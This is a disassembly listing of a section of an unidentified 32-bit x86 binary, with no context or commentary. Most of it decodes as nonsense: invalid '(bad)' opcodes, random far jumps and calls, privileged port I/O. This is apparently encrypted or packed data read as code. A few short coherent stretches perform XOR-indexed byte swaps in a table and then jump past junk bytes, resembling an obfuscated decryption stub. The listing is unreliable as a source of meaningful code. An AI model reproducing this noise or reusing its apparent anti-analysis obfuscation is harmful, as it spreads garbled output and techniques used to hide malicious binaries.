  40c898:	sub    DWORD PTR [ecx-0x6a378bd5],eax
  40c89e:	push   0xafcdf28d
  40c8a3:	(bad)
  40c8a6:	mov    cl,al
  40c8a8:	inc    esi
  40c8a9:	sub    eax,0xbad3b3e3
  40c8ae:	rcr    BYTE PTR [ebx-0x37],1
  40c8b1:	pop    eax
  40c8b2:	int    0xbe
  40c8b4:	sub    al,0x57
  40c8b6:	stos   BYTE PTR es:[edi],al
  40c8b7:	inc    ecx
  40c8b8:	iret   
  40c8b9:	push   edi
  40c8ba:	ja     0x40c939
  40c8bc:	xor    DWORD PTR [esi],ebp
  40c8be:	inc    esp
  40c8bf:	loopne 0x40c8d3
  40c8c1:	mov    eax,0x1b0ce66a
  40c8c6:	nop
  40c8c7:	pusha  
  40c8c8:	push   ebp
  40c8c9:	push   edx
  40c8ca:	inc    ebp
  40c8cb:	rol    DWORD PTR [esi+0x78],cl
  40c8ce:	(bad)  
  40c8d0:	xchg   edx,eax
  40c8d1:	cmp    ebx,0x36
  40c8d4:	add    ah,dh
  40c8d6:	and    bl,dl
  40c8d8:	mul    DWORD PTR [edi-0x4738f907]
  40c8de:	int3   
  40c8df:	iret   
  40c8e0:	cmp    BYTE PTR [ebx-0x24],ah
  40c8e3:	sahf   
  40c8e4:	fld    TBYTE PTR [eax+0x69]
  40c8e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8e8:	sub    al,0xf6
  40c8ea:	scas   eax,DWORD PTR es:[edi]
  40c8eb:	sub    cl,dl
  40c8ed:	and    eax,0xa02e8b69
  40c8f2:	sbb    DWORD PTR [ecx+0x751017dd],eax
  40c8f8:	sbb    BYTE PTR [esi-0x32446fb7],bl
  40c8fe:	inc    edi
  40c8ff:	inc    ebx
  40c900:	ret    0xfa76
  40c903:	(bad)  
  40c905:	rcl    BYTE PTR [ebx+0x1670d80b],cl
  40c90b:	(bad)  
  40c90c:	sbb    al,0xc6
  40c90e:	mov    gs,ebp
  40c910:	adc    al,0xb7
  40c912:	jb     0x40c8c5
  40c914:	and    BYTE PTR [edx+0x7cd99127],cl
  40c91a:	cli    
  40c91b:	cmp    al,0xca
  40c91d:	cld    
  40c91e:	icebp  
  40c91f:	in     al,dx
  40c920:	sub    DWORD PTR [edi-0x5],ecx
  40c923:	addr16 stc 
  40c925:	aam    0xf8
  40c927:	test   al,0x29
  40c929:	add    bl,BYTE PTR [esi-0x75019cc0]
  40c92f:	cmp    ch,dh
  40c931:	xchg   edi,eax
  40c932:	into   
  40c933:	(bad)  
  40c934:	adc    ecx,DWORD PTR [edi-0x6e]
  40c937:	xlat   BYTE PTR ds:[ebx]
  40c938:	retf   
  40c939:	mov    edi,0xc4479b67
  40c93e:	mov    BYTE PTR [esi],cl
  40c940:	ins    BYTE PTR es:[edi],dx
  40c941:	sbb    eax,0x3db2bf8
  40c946:	push   ebp
  40c947:	in     al,dx
  40c948:	mov    edi,DWORD PTR [ebp-0x1c]
  40c94b:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c952:	mov    BYTE PTR [ebp+0xf],dl
  40c955:	mov    edx,DWORD PTR [ebp-0xc]
  40c958:	xor    edx,eax
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	paddd  mm7,QWORD PTR [edi+esi*1]
  40c9a1:	cmp    al,0xca
  40c9a3:	xchg   edx,eax
  40c9a4:	jle    0x40ca24
  40c9a6:	jo     0x40ca21
  40c9a8:	jle    0x40ca28
  40c9aa:	dec    ebx
  40c9ab:	cld    
  40c9ac:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9ae:	lods   eax,DWORD PTR ds:[esi]
  40c9af:	xor    ecx,DWORD PTR [esi+eax*4+0x7f]
  40c9b3:	mov    ?,WORD PTR [edx+0x31]
  40c9b6:	retf   0xb929
  40c9b9:	pop    edi
  40c9ba:	adc    eax,0x580bb9c2
  40c9bf:	ins    DWORD PTR es:[edi],dx
  40c9c0:	retf   0x145a
  40c9c3:	test   bl,0x44
  40c9c6:	push   cs
  40c9c7:	loopne 0x40c986
  40c9c9:	xchg   ebp,eax
  40c9ca:	in     al,dx
  40c9cb:	leave  
  40c9cc:	in     al,0x4
  40c9ce:	mov    ebx,0x8f0989b3
  40c9d3:	xchg   ecx,eax
  40c9d4:	mov    ah,0xd7
  40c9d6:	xor    BYTE PTR [ecx+0x177ec6d8],0xfc
  40c9dd:	mov    al,ds:0xcd74df3d
  40c9e2:	imul   ebx,DWORD PTR [ebp+0x508a4557],0xc7d137a1
  40c9ec:	sbb    BYTE PTR [esi+0x4c8e3b5c],bl
  40c9f2:	imul   DWORD PTR es:[edx]
  40c9f5:	shr    BYTE PTR [ebx],cl
  40c9f7:	push   esp
  40c9f8:	xor    eax,0xc074a88
  40c9fd:	or     edi,esp
  40c9ff:	sub    dl,BYTE PTR [edi+0x3e4726d7]
  40ca05:	push   eax
  40ca06:	dec    edi
  40ca07:	pop    edx
  40ca08:	cs (bad) 
  40ca0a:	xor    eax,0xae8e5d50
  40ca0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca11:	std    
  40ca12:	(bad)  
  40ca13:	stos   DWORD PTR es:[edi],eax
  40ca14:	dec    edi
  40ca15:	xor    BYTE PTR [edx],bl
  40ca17:	test   eax,0x4c1d096d
  40ca1c:	push   0xffffffb7
  40ca1e:	stc    
  40ca1f:	fldenv [edi+0x17c27534]
  40ca25:	sub    al,0x8c
  40ca27:	popf   
  40ca28:	add    DWORD PTR [ebx+0x67],eax
  40ca2b:	jnp    0x40ca0b
  40ca2d:	push   es
  40ca2e:	fs pop ebx
  40ca30:	sub    eax,0xac5189ee
  40ca35:	mov    WORD PTR [ecx+esi*1],?
  40ca38:	shl    BYTE PTR [esp+ebp*4],0xbc
  40ca3c:	test   BYTE PTR [edi],0xd
  40ca3f:	je     0x40c9d9
  40ca41:	and    BYTE PTR ds:0xdfd89ce9,bh
  40ca47:	xchg   ebx,eax
  40ca48:	xor    ebx,DWORD PTR [edi+0x7d6209bf]
  40ca4e:	rcl    BYTE PTR [ecx-0xfd703f7],1
  40ca54:	xchg   esp,eax
  40ca55:	leave  
  40ca56:	xchg   ebx,eax
  40ca57:	shl    DWORD PTR [edx-0x59],cl
  40ca5a:	pop    edi
  40ca5b:	ins    BYTE PTR es:[edi],dx
  40ca5c:	ret    0x14cf
  40ca5f:	sbb    eax,0xd5d2547d
  40ca64:	cmp    al,BYTE PTR [edx+0x79baa19e]
  40ca6a:	jmp    0x40cadb
  40ca6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca6d:	sti    
  40ca6e:	mov    ?,ebp
  40ca70:	jae    0x40ca9d
  40ca72:	lahf   
  40ca73:	xor    cl,BYTE PTR [eax-0x2901c694]
  40ca79:	push   edx
  40ca7a:	pusha  
  40ca7b:	repz es mov ebp,eax
  40ca7f:	movsx  eax,WORD PTR [ebx-0x5ddc17c9]
  40ca86:	cmp    eax,0x632289c4
  40ca8b:	jae    0x40cadb
  40ca8d:	sub    al,0xa3
  40ca8f:	pop    edx
  40ca90:	pop    eax
  40ca91:	out    dx,al
  40ca92:	cli    
  40ca93:	push   esi
  40ca94:	and    DWORD PTR [ebx+0x21],edi
  40ca97:	out    dx,al
  40ca98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca99:	pushf  
  40ca9a:	gs scas al,BYTE PTR es:[edi]
  40ca9c:	test   eax,0xa67fe6db
  40caa1:	xchg   DWORD PTR ss:[esi-0x7c],ebx
  40caa5:	mov    eax,0xc88036e6
  40caaa:	jl     0x40cb27
  40caac:	pop    ds
  40caad:	mov    ebx,0xd0916cf0
  40cab2:	lock cmovbe edi,DWORD PTR [edx+0x7f545b3e]
  40caba:	ins    BYTE PTR es:[edi],dx
  40cabb:	in     al,0xb0
  40cabd:	mov    bh,0xdf
  40cabf:	jo     0x40cb27
  40cac1:	dec    ebp
  40cac2:	sub    al,0xa
  40cac4:	xor    bl,BYTE PTR [eax-0x55]
  40cac7:	aad    0xd
  40cac9:	mov    dl,al
  40cacb:	aam    0xe7
  40cacd:	mov    dl,0x26
  40cacf:	in     eax,dx
  40cad0:	cmp    eax,0x70a0938d
  40cad5:	xchg   ecx,eax
  40cad6:	test   DWORD PTR [ecx+ebp*2-0x45],0xd077eb45
  40cade:	sbb    DWORD PTR [ebx+0x613af3d3],0x6a
  40cae5:	ss fwait
  40cae7:	or     eax,0xf50f7651
  40caec:	fst    QWORD PTR [ebx]
  40caee:	adc    BYTE PTR [edx-0x11],ah
  40caf1:	mov    esp,0x8410c7e
  40caf6:	pushf  
  40caf7:	jns    0x40cb05
  40caf9:	repnz popa 
  40cafb:	mov    dl,0x34
  40cafd:	sbb    al,0xac
  40caff:	jne    0x40cb42
  40cb01:	jmp    0x277a59a3
  40cb06:	cmp    BYTE PTR [ecx],0xc7
  40cb09:	xchg   ebx,eax
  40cb0a:	sbb    DWORD PTR [edx+0x2518a302],ecx
  40cb10:	vmwrite ebx,DWORD PTR [ebp+0x24]
  40cb14:	lds    edx,FWORD PTR [edx+0x3a8cc182]
  40cb1a:	mov    al,0x10
  40cb1c:	or     al,0x82
  40cb1e:	sti    
  40cb1f:	movntps XMMWORD PTR [eax],xmm3
  40cb22:	cmp    DWORD PTR [ebp-0x3e661cc2],ebx
  40cb28:	loop   0x40cb51
  40cb2a:	pop    es
  40cb2b:	jp     0x40caaf
  40cb2d:	pushf  
  40cb2e:	xchg   ecx,eax
  40cb2f:	mov    eax,ds:0xaa1bf53f
  40cb34:	mov    cl,cl
  40cb36:	mov    bh,0x39
  40cb38:	fs loopne 0x40cafd
  40cb3b:	mov    dh,dl
  40cb3d:	dec    edi
  40cb3e:	fs inc ecx
  40cb40:	sti    
  40cb41:	push   esi
  40cb42:	pop    edi
  40cb43:	outs   dx,BYTE PTR ds:[esi]
  40cb44:	daa    
  40cb45:	inc    esp
  40cb46:	lods   al,BYTE PTR ds:[esi]
  40cb47:	repz inc ebx
  40cb49:	test   eax,0x226c6d3b
  40cb4e:	cwde   
  40cb4f:	or     ebx,ebx
  40cb51:	repnz test ebp,edi
  40cb54:	sbb    esp,0x55e6adf
  40cb5a:	pushf  
  40cb5b:	cs mov edi,0x2a86588e
  40cb61:	sar    DWORD PTR [edi-0x8d271d7],cl
  40cb67:	push   edx
  40cb68:	inc    edx
  40cb69:	sub    DWORD PTR [esi],esi
  40cb6b:	inc    ebp
  40cb6c:	popf   
  40cb6d:	and    DWORD PTR gs:[ebp-0x3d],ebx
  40cb71:	sbb    bl,BYTE PTR [edx+0x6f30ba9e]
  40cb77:	(bad)  
  40cb79:	lods   eax,DWORD PTR ds:[esi]
  40cb7a:	popa   
  40cb7b:	arpl   WORD PTR [eax],bp
  40cb7d:	shl    BYTE PTR [edi],1
  40cb7f:	dec    esi
  40cb80:	out    dx,al
  40cb81:	aad    0x39
  40cb83:	add    ecx,0x8b242911
  40cb89:	ja     0x40cbcc
  40cb8b:	mov    ecx,0x5722940c
  40cb90:	mov    ebx,0xd291928d
  40cb95:	fld    TBYTE PTR ds:0xd270fe33
  40cb9b:	test   DWORD PTR [esi],ecx
  40cb9d:	adc    BYTE PTR [ebx+edi*8+0x5c3df8e8],dh
  40cba4:	outs   dx,BYTE PTR ds:[esi]
  40cba5:	(bad)  
  40cba6:	sti    
  40cba7:	arpl   dx,bx
  40cba9:	cmp    ecx,DWORD PTR [ebx]
  40cbab:	push   ebp
  40cbac:	pop    edx
  40cbad:	(bad)  
  40cbae:	cmc    
  40cbaf:	icebp  
  40cbb0:	nop
  40cbb1:	push   cs
  40cbb2:	xchg   DWORD PTR [edi+edi*2+0x5c218853],eax
  40cbb9:	shl    DWORD PTR [ecx-0x76],cl
  40cbbc:	ins    DWORD PTR es:[edi],dx
  40cbbd:	push   es
  40cbbe:	fmul   QWORD PTR [ecx]
  40cbc0:	or     BYTE PTR [eax+edx*8],bl
  40cbc3:	pop    esi
  40cbc4:	dec    esi
  40cbc5:	sub    ecx,eax
  40cbc7:	fidiv  WORD PTR [ecx]
  40cbc9:	jbe    0x40cb8b
  40cbcb:	jmp    0x40cc37
  40cbcd:	out    dx,eax
  40cbce:	and    eax,DWORD PTR [esi]
  40cbd0:	es jecxz 0x40cc2f
  40cbd3:	or     ch,BYTE PTR [edx+0x70]
  40cbd6:	in     al,0x5d
  40cbd8:	test   DWORD PTR [edi-0x447de9ad],ebp
  40cbde:	jne    0x40cbb2
  40cbe0:	dec    ebx
  40cbe1:	jmp    0x40cc10
  40cbe3:	in     al,0x54
  40cbe5:	push   ebp
  40cbe6:	aaa    
  40cbe7:	arpl   WORD PTR [eax],cx
  40cbe9:	imul   esi,DWORD PTR [ecx],0x32f62bc0
  40cbef:	repnz in eax,0xd4
  40cbf2:	fistp  DWORD PTR ds:0x75aaa3f5
  40cbf8:	xor    eax,0x4bdc984f
  40cbfd:	or     DWORD PTR [ebx+esi*4],0x5ad6608d
  40cc04:	cmp    ebp,ebp
  40cc06:	pop    ebp
  40cc07:	push   es
  40cc08:	or     al,0x57
  40cc0a:	lds    esp,FWORD PTR [ebx-0x26]
  40cc0d:	and    edx,DWORD PTR [edx]
  40cc0f:	inc    ebx
  40cc10:	test   BYTE PTR [esp+eax*2],cl
  40cc13:	nop
  40cc14:	mov    ds:0x57828747,eax
  40cc19:	(bad)  
  40cc1a:	mov    ebx,0x1013a1b5
  40cc1f:	ss aas 
  40cc21:	mov    ebp,ecx
  40cc23:	lds    eax,FWORD PTR [eax+0x1b]
  40cc26:	sub    ebx,DWORD PTR [ebx+0xf]
  40cc29:	pop    es
  40cc2a:	jg     0x40cc9a
  40cc2c:	or     dl,BYTE PTR [esi]
  40cc2e:	loope  0x40cc23
  40cc30:	add    ah,0x4b
  40cc33:	xor    al,0xd0
  40cc35:	push   ebx
  40cc36:	arpl   WORD PTR [esi+0x15],cx
  40cc39:	xchg   edi,eax
  40cc3a:	fbld   TBYTE PTR [ebp-0x5031052]
  40cc40:	jp     0x40cc41
  40cc42:	daa    
  40cc43:	je     0x40cc15
  40cc45:	sti    
  40cc46:	cmp    eax,0xd2fca5b5
  40cc4b:	imul   DWORD PTR [eax]
  40cc4d:	lods   al,BYTE PTR ds:[esi]
  40cc4e:	sbb    al,0xb0
  40cc50:	in     eax,0x3e
  40cc52:	mov    cl,0xac
  40cc54:	add    al,0x8c
  40cc56:	aam    0x93
  40cc58:	repz imul ebp,esp,0xffffff82
  40cc5c:	inc    esi
  40cc5d:	add    eax,0x205ef707
  40cc62:	push   es
  40cc63:	fs dec edx
  40cc65:	(bad)  
  40cc66:	lds    esp,FWORD PTR [edx-0x5c]
  40cc69:	ret    0x4303
  40cc6c:	bound  edx,QWORD PTR [ebx+0x6febb647]
  40cc72:	mov    eax,0x4f6c1296
  40cc77:	and    al,0xf1
  40cc79:	pop    esp
  40cc7a:	jle    0x40cc49
  40cc7c:	jmp    0x40e8:0xc63042ef
  40cc83:	pop    ebx
  40cc84:	mov    ebp,0x547cf6aa
  40cc89:	test   eax,0x6cdda392
  40cc8e:	pop    eax
  40cc8f:	push   ebx
  40cc90:	mov    dl,0x3d
  40cc92:	jmp    0x40cc24
  40cc94:	push   ecx
  40cc95:	or     DWORD PTR [esi-0x3270d94b],ebx
  40cc9b:	adc    ch,cl
  40cc9d:	jmp    0x40ccc4
  40cc9f:	paddsb mm4,QWORD PTR [edx]
  40cca2:	out    dx,al
  40cca3:	aaa    
  40cca4:	xor    DWORD PTR [ecx+ebx*4+0x61],ecx
  40cca8:	or     al,0xda
  40ccaa:	aam    0xe9
  40ccac:	int3   
  40ccad:	lds    ebx,FWORD PTR [eax]
  40ccaf:	mov    ecx,DWORD PTR [esi+0x63]
  40ccb2:	jne    0x40cc3b
  40ccb4:	repnz push eax
  40ccb6:	dec    esi
  40ccb7:	sti    
  40ccb8:	adc    BYTE PTR [edx],0x2b
  40ccbb:	arpl   WORD PTR [edx],ax
  40ccbd:	call   0x663f:0xd49ec58f
  40ccc4:	jbe    0x40cc50
  40ccc6:	lahf   
  40ccc7:	jg     0x40cc7d
  40ccc9:	sbb    al,0xe1
  40cccb:	std    
  40cccc:	mov    bh,0x59
  40ccce:	dec    esp
  40cccf:	in     eax,dx
  40ccd0:	sbb    al,0x53
  40ccd2:	out    0x10,eax
  40ccd4:	adc    bh,BYTE PTR [edx+0xc]
  40ccd7:	cli    
  40ccd8:	push   es
  40ccd9:	inc    edx
  40ccda:	or     bh,BYTE PTR [edx]
  40ccdc:	and    eax,0xc06f9fca
  40cce1:	in     al,0xe3
  40cce3:	add    al,0x7e
  40cce5:	nop
  40cce6:	jne    0x40cc76
  40cce8:	(bad)  
  40cce9:	mov    ebp,DWORD PTR [eax+0x51]
  40ccec:	(bad)  
  40cced:	and    BYTE PTR [esi],ch
  40ccef:	aad    0xb7
  40ccf1:	aam    0xe4
  40ccf3:	test   al,ah
  40ccf5:	pop    esi
  40ccf6:	pusha  
  40ccf7:	mov    esi,0x948de8f0
  40ccfc:	mov    ds:0xeee42da5,al
  40cd01:	enter  0x32bd,0xa5
  40cd05:	mov    ch,0xa8
  40cd07:	add    eax,0x56140a81
  40cd0c:	in     al,dx
  40cd0d:	push   ebx
  40cd0e:	mov    esp,0xc28450a0
  40cd13:	cmp    DWORD PTR [edx-0x7d],0x7a48646
  40cd1a:	test   DWORD PTR [edx-0x60],edi
  40cd1d:	dec    edi
  40cd1e:	xchg   BYTE PTR [ebp+edi*4+0x4fb36507],al
  40cd25:	and    ebp,DWORD PTR [eax+eax*8+0x5263f88c]
  40cd2c:	ins    DWORD PTR es:[edi],dx
  40cd2d:	mov    ds:0x848e78c3,eax
  40cd32:	dec    ebx
  40cd33:	js     0x40cd2f
  40cd35:	inc    eax
  40cd36:	push   0xffffffe6
  40cd38:	lock outs dx,DWORD PTR ds:[esi]
  40cd3a:	sbb    ah,BYTE PTR ds:0xb8ac001
  40cd40:	push   edi
  40cd41:	mov    al,0xba
  40cd43:	in     al,0xb6
  40cd45:	std    
  40cd46:	mov    edi,0x8dae124c
  40cd4b:	xchg   edx,eax
  40cd4c:	out    0x85,eax
  40cd4e:	aaa    
  40cd4f:	mov    ecx,0xb8822bbd
  40cd54:	gs jbe 0x40cd9a
  40cd57:	mov    edx,0x946eeb94
  40cd5c:	rol    dl,1
  40cd5e:	pop    ebp
  40cd5f:	outs   dx,BYTE PTR ds:[esi]
  40cd60:	addr16 push ecx
  40cd62:	jmp    0x518b7ed9
  40cd67:	mov    WORD PTR [ecx-0x4e6320f8],?
  40cd6d:	add    edx,edx
  40cd6f:	mov    ah,0xb8
  40cd71:	push   cs
  40cd72:	mov    edx,0x14fbd0a8
  40cd77:	sub    eax,0x37e3d901
  40cd7c:	retf   
  40cd7d:	shl    edi,cl
  40cd7f:	call   0x362b:0xf955874e
  40cd86:	div    edx
  40cd88:	gs pop edx
  40cd8a:	(bad)  
  40cd8b:	shr    DWORD PTR [eax+0x4],cl
  40cd8e:	sahf   
  40cd8f:	stos   DWORD PTR es:[edi],eax
  40cd90:	aaa    
  40cd91:	fstp   QWORD PTR [ebx]
  40cd93:	push   ebp
  40cd94:	mov    esp,0x16e41792
  40cd99:	xor    esp,DWORD PTR [esi]
  40cd9b:	pop    ds
  40cd9c:	xchg   ebp,eax
  40cd9d:	aaa    
  40cd9e:	adc    BYTE PTR [esi],ch
  40cda0:	jge    0x40cda8
  40cda2:	test   DWORD PTR [ebx-0x66e06b78],edx
  40cda8:	jb     0x40cddc
  40cdaa:	add    BYTE PTR [ebx+0x7d8bbc55],cl
  40cdb0:	hlt    
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	ins    DWORD PTR es:[edi],dx
  40cdda:	(bad)  
  40cddb:	clc    
  40cddc:	ror    esp,0x9e
  40cddf:	jle    0x40ce5f
  40cde1:	jo     0x40ce5c
  40cde3:	jle    0x40ce63
  40cde5:	stos   DWORD PTR es:[edi],eax
  40cde6:	xchg   ebp,eax
  40cde7:	stos   DWORD PTR es:[edi],eax
  40cde8:	or     eax,DWORD PTR [ebx]
  40cdea:	sbb    DWORD PTR [ecx],esp
  40cdec:	mov    eax,?
  40cdee:	nop
  40cdef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdf0:	lock dec ebp
  40cdf2:	jo     0x40cde2
  40cdf4:	mov    ds:0x68cc4578,eax
  40cdf9:	imul   eax,DWORD PTR [edx],0x2a
  40cdfc:	inc    edx
  40cdfd:	repnz sbb eax,0x6dc71af7
  40ce03:	mov    eax,ds:0x33cc999b
  40ce08:	das    
  40ce09:	cmp    al,0xa3
  40ce0b:	and    BYTE PTR [esi],al
  40ce0d:	xor    al,0x89
  40ce0f:	pop    esi
  40ce10:	ret    
  40ce11:	or     al,0x3e
  40ce13:	(bad)
  40ce16:	stos   DWORD PTR es:[edi],eax
  40ce17:	mov    ebp,DWORD PTR fs:[eax+edi*4]
  40ce1b:	out    0x87,eax
  40ce1d:	adc    eax,0x372194e8
  40ce22:	popf   
  40ce23:	loope  0x40cddc
  40ce25:	(bad)  
  40ce27:	jmp    0x42ab2f12
  40ce2c:	outs   dx,DWORD PTR ds:[esi]
  40ce2d:	int3   
  40ce2e:	imul   ebx,DWORD PTR [edi-0x8],0x68
  40ce32:	xor    DWORD PTR ds:0x9a1461d,ebp
  40ce38:	je     0x40ce3e
  40ce3a:	(bad)  
  40ce3b:	ficomp DWORD PTR [edi-0x2700eb48]
  40ce41:	retf   
  40ce42:	cmp    eax,0xe2a3bf98
  40ce47:	fbld   TBYTE PTR [eax]
  40ce49:	inc    esp
  40ce4a:	fwait
  40ce4b:	js     0x40ce4d
  40ce4d:	jl     0x40cde9
  40ce4f:	retf   
  40ce50:	inc    ebp
  40ce51:	and    cl,BYTE PTR [ecx+ecx*2]
  40ce54:	gs pusha 
  40ce56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce57:	out    0xfd,al
  40ce59:	arpl   WORD PTR [edi],bp
  40ce5b:	(bad)  
  40ce5c:	retf   
  40ce5d:	push   cs
  40ce5e:	add    DWORD PTR [ebx+0xda0565e],esp
  40ce64:	mov    esp,0x3c1a9c16
  40ce69:	daa    
  40ce6a:	nop
  40ce6b:	jl     0x40ce21
  40ce6d:	mov    edx,0x13cb8642
  40ce72:	cmp    DWORD PTR [edi+0x5],esp
  40ce75:	mov    ebx,DWORD PTR [edi]
  40ce77:	sub    ah,BYTE PTR [edx+0x59]
  40ce7a:	jmp    FWORD PTR [ebx+0x7e975d1e]
  40ce80:	xlat   BYTE PTR ds:[ebx]
  40ce81:	xor    BYTE PTR [ebx-0x5b8a64f],bl
  40ce87:	sub    BYTE PTR [edi],bh
  40ce89:	sbb    BYTE PTR [ebx-0x7fab51be],cl
  40ce8f:	xchg   DWORD PTR [ebx+0x50],ecx
  40ce92:	scas   al,BYTE PTR es:[edi]
  40ce93:	js     0x40ce42
  40ce95:	scas   eax,DWORD PTR es:[edi]
  40ce96:	xchg   ecx,eax
  40ce97:	or     eax,DWORD PTR [edx-0x46]
  40ce9a:	pop    ss
  40ce9b:	cwde   
  40ce9c:	jns    0x40ced7
  40ce9e:	dec    edi
  40ce9f:	lea    edi,[edi]
  40cea1:	jmp    0x40ce88
  40cea3:	(bad)  
  40cea4:	add    bl,BYTE PTR [esi+0x19]
  40cea7:	shr    DWORD PTR [ebx+0x55],1
  40ceaa:	mov    ecx,0x89473e2d
  40ceaf:	xor    dh,cl
  40ceb1:	stc    
  40ceb2:	icebp  
  40ceb3:	pop    es
  40ceb4:	call   0x5374:0xe1cd534c
  40cebb:	sbb    DWORD PTR [ecx],esi
  40cebd:	(bad)  
  40cebe:	jbe    0x40cf23
  40cec0:	data16 daa 
  40cec2:	adc    ecx,DWORD PTR [esi-0x12f1a527]
  40cec8:	jno    0x40ceb8
  40ceca:	pop    esp
  40cecb:	jg     0x40ceef
  40cecd:	push   0x52e95a59
  40ced2:	in     al,dx
  40ced3:	and    al,0x5
  40ced5:	cmc    
  40ced6:	mov    cl,BYTE PTR [edi]
  40ced8:	adc    ch,dh
  40ceda:	addr16 inc edx
  40cedc:	and    DWORD PTR [ebp+0x11],edx
  40cedf:	jp     0x40cf0f
  40cee1:	xchg   BYTE PTR [ebp+0x4e],bh
  40cee4:	cmp    ebx,DWORD PTR ds:0x2db72d03
  40ceea:	jbe    0x40ceb7
  40ceec:	out    dx,eax
  40ceed:	xor    BYTE PTR [edi+0x4f6ee674],ch
  40cef3:	dec    edi
  40cef4:	pop    esp
  40cef5:	xor    DWORD PTR [eax+0x309fffcb],esi
  40cefb:	add    cl,BYTE PTR [edi+ebp*1]
  40cefe:	ins    DWORD PTR es:[edi],dx
  40ceff:	outs   dx,BYTE PTR ds:[esi]
  40cf00:	add    DWORD PTR [edx],ebp
  40cf02:	cmp    eax,0x791464af
  40cf07:	or     eax,0x977c9aab
  40cf0c:	inc    edx
  40cf0d:	inc    ecx
  40cf0e:	idiv   esp
  40cf10:	mov    WORD PTR [esi+0x171a130b],fs
  40cf16:	mov    ebp,0x6088204f
  40cf1b:	mov    edi,0x10d5ad29
  40cf20:	into   
  40cf21:	retf   
  40cf22:	scas   al,BYTE PTR es:[edi]
  40cf23:	xchg   DWORD PTR [ebp+0x90a2194],edx
  40cf29:	and    bh,BYTE PTR [edi]
  40cf2b:	cmp    BYTE PTR [edx],0x92
  40cf2e:	push   ebp
  40cf2f:	nop
  40cf30:	mov    ds:0xbd4e67ac,eax
  40cf35:	mov    edx,DWORD PTR [ebp-0x6ad4382b]
  40cf3b:	cdq    
  40cf3c:	ins    BYTE PTR es:[edi],dx
  40cf3d:	push   esp
  40cf3e:	mov    dl,0xb0
  40cf40:	sub    BYTE PTR [ecx+0x2cd9a1b2],bh
  40cf46:	or     BYTE PTR [edi+edx*4+0xf],dl
  40cf4a:	fmulp  st(5),st
  40cf4c:	ret    
  40cf4d:	fiadd  WORD PTR [edx-0x30047bbe]
  40cf53:	ror    ah,1
  40cf55:	and    cl,bh
  40cf57:	popf   
  40cf58:	add    ecx,DWORD PTR [edi+0x52]
  40cf5b:	cmp    esp,ebx
  40cf5d:	sub    BYTE PTR ds:0xc2cfb9d9,al
  40cf63:	icebp  
  40cf64:	bound  eax,QWORD PTR [ebx+0x26c8ee57]
  40cf6a:	sbb    al,0xce
  40cf6c:	in     al,dx
  40cf6d:	sub    al,0x95
  40cf6f:	(bad)  [esi+0x37]
  40cf72:	inc    eax
  40cf73:	push   ebp
  40cf74:	jmp    0x40cf09
  40cf76:	push   ecx
  40cf77:	mov    eax,DWORD PTR [eax-0x2c]
  40cf7a:	in     al,dx
  40cf7b:	lods   eax,DWORD PTR ds:[esi]
  40cf7c:	call   0xe4435568
  40cf81:	sar    BYTE PTR [ebx+0x15],1
  40cf84:	xchg   edi,eax
  40cf85:	cmp    al,0xc
  40cf87:	aad    0x1a
  40cf89:	fiadd  WORD PTR [eax+ecx*1-0x66]
  40cf8d:	add    esi,esi
  40cf8f:	xor    eax,0x392a34fc
  40cf94:	aas    
  40cf95:	nop
  40cf96:	xchg   esi,eax
  40cf97:	fmul   QWORD PTR [esi-0x45b0f0bb]
  40cf9d:	or     DWORD PTR [ecx-0x4f],esp
  40cfa0:	test   BYTE PTR [ebp-0x21521928],ah
  40cfa6:	out    dx,eax
  40cfa7:	gs push edx
  40cfa9:	cmp    al,0x9
  40cfab:	pop    ds
  40cfac:	adc    al,0xad
  40cfae:	inc    esi
  40cfaf:	or     ch,al
  40cfb1:	push   ds
  40cfb2:	ror    DWORD PTR [ecx+0x5],cl
  40cfb5:	inc    ebx
  40cfb6:	scas   al,BYTE PTR es:[edi]
  40cfb7:	lock repz mov esi,DWORD PTR [eax+esi*8]
  40cfbc:	ds lahf 
  40cfbe:	and    edi,esi
  40cfc0:	mov    bl,BYTE PTR [ebp-0x47]
  40cfc3:	mov    DWORD PTR [esi],eax
  40cfc5:	rcr    cl,1
  40cfc7:	and    ebp,0x63438381
